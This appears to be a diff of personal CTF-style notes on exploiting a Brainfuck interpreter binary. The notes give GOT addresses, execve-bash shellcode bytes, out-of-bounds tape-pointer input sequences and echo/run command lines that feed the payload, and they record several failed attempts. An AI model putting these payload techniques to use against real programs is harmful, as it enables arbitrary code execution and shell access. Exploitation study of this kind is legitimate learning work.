@@ -1,20 +1,76 @@
 tape ptr is stored in 0x0804a080
 ptr initially stores 0x0804a0a0 (first entry)
 case '.' is at 0x804863a
+case '-' is at 0x804862b
 GOT entry for putchar is at 0x08 04 a0 30 = 112 bytes before initial entry
 putchar itself is at 0x 08 04 84 d6
+brainfreak call to putchar is at 0x08048648
 
 install shellcode, move ptr to putchar GOT entry, modify putchar GOT entry to point to shellcode, invoke '.' command to call putchar and deploy payload
 
-use tape to store shellcode -- close enough to putchar
-
-    0:   b8 0b 00 00 00          mov    eax,0xb
-    5:   bb a0 a0 04 08          mov    ebx,0x804a0a0
-    a:   31 c9                   xor    ecx,ecx
-    c:   31 db                   xor    ebx,ebx
+shellcode:
+    0:   b8 0b 00 00 00          mov    eax,0xb         ; execve syscall
+    5:   bb a0 a0 04 08          mov    ebx,0x804a0a0   ; ptr to "bash" string, installed in tape
+    a:   31 c9                   xor    ecx,ecx         ; argv (nullptr)
+    c:   31 db                   xor    ebx,ebx         ; envp (nullptr)
     e:   0f 05                   syscall
-b0 0b 00 00 00 bb a0 a0 04 08 31 c9 31 db 0f 05
-\xb0\x0b\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05
+
+
+
+######################################################################## fails: attempts to install payload into main(), which is executable but not writable
+1. install "bash" string in tape
+2. navigate pointer to itself: adjust pointer to point to 0x08048774 -- just after the for loop in main()
+3. install payload here
+
+,>,>,>,                                 store "bash" in tape: pointer now at 0x0804a0a3                                 bash
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<     move ptr to point to its own LSB: pointer is now at 0x0804a080
+>,<<<<<<<<<<<<                          store \x87 in 2nd-LSB and decrement pointer until pointer is at 0x08048774      \x87
+,>,>,->,->,->,>,>,>,>,>,>,>,>,>,>,      install payload:                                                                \xb8\x0b\x01\x01\x01\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05 
+
+echo -n -e ",>,>,>,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,<<<<<<<<<<<<,>,>,->,->,->,>,>,>,>,>,>,>,>,>,>,\nbash\x87\xb8\x0b\x01\x01\x01\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05\n"
+run <<< $(echo -n -e ",>,>,>,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,<<<<<<<<<<<<,>,>,->,->,->,>,>,>,>,>,>,>,>,>,>,\nbash\x87\xb8\x0b\x01\x01\x01\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05\n")
+
+######################################################################## fails: installs payload directly into GOT, which is non executable (it's just a jump table)
+store "bash":   bash                    (7)
+,>,>,>,
+move ptr 115 bytes to left: puts pointer on putchar got 2nd byte (LSB) @ 0x0804a031 (115)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+store 0xa010:     \xa0\x10              (3)
+,<,
+move ptr 32 bytes to left: puts pointer at 0x0804a010 (32)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+store payload: \xb8\x0b\x01\x01\x01\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05 (35)
+,>,>,->,->,->,>,>,>,>,>,>,>,>,>,>,>
+deploy
+.
+
+run <<< $(echo -n -e ",>,>,>,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,<,<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,>,->,->,->,>,>,>,>,>,>,>,>,>,>,>.\nbash\xa0\x10\xb8\x0b\x01\x01\x01\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05")
+continue 176
+
+######################################################################## give up: too many bytes, will run into same executable-segment issue
+store 'b', shift right (+99 = 99)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+store 'a', shift right (+98 = 197)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+store 's', shift right (+116 = 313)
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+store 'h', shift right (+105 = 418)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
+shift right to leave null terminator for string (+1 = 419)
+>
+install byte 1 of mov eax, 0xb (+201 = 619)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+install byte 2 of mov eax... (+12 = 631)
+>+++++++++++
+finish constructing mov eax, put cursor at start of next op... (+4 = 635)
+>>>>
+install lea ebx, [0x0804a0a0]
+
+
+
+
+######################################################################## fails: installs payload in tape, which is nonexecutable memory
+payload is 13 bytes
 
 store "bash":   bash
 ,>,>,>,>
@@ -39,33 +95,3 @@ deploy
 
 echo -n -e ",>,>,>,>,>,>>>>,>,>,>,>,>,>,>,>,>,>,><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,.\nbash\xb8\x0b\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05\xa4\xa0\n" | ./brainfuck
 run <<< $(echo -n -e ",>,>,>,>,>,>>>>,>,>,>,>,>,>,>,>,>,>,><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,>,.\nbash\xb8\x0b\xbb\xa0\xa0\x04\x08\x31\xc9\x31\xdb\x0f\x05\xa4\xa0\n")
-
-shellcode:
-execve
-eax = 11 = 0xb
-arg0 (ebx): const char* filename
-arg1 (ecx): const char** argv
-arg2 (edx): const char* envp
-
-
-
-
-
-
-store 'b', shift right (+99 = 99)
-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
-store 'a', shift right (+98 = 197)
-+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
-store 's', shift right (+116 = 313)
-+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
-store 'h', shift right (+105 = 418)
-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>
-shift right to leave null terminator for string (+1 = 419)
->
-install byte 1 of mov eax, 0xb (+201 = 619)
-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-install byte 2 of mov eax... (+12 = 631)
->+++++++++++
-finish constructing mov eax, put cursor at start of next op... (+4 = 635)
->>>>
-install lea ebx, [0x0804a0a0]
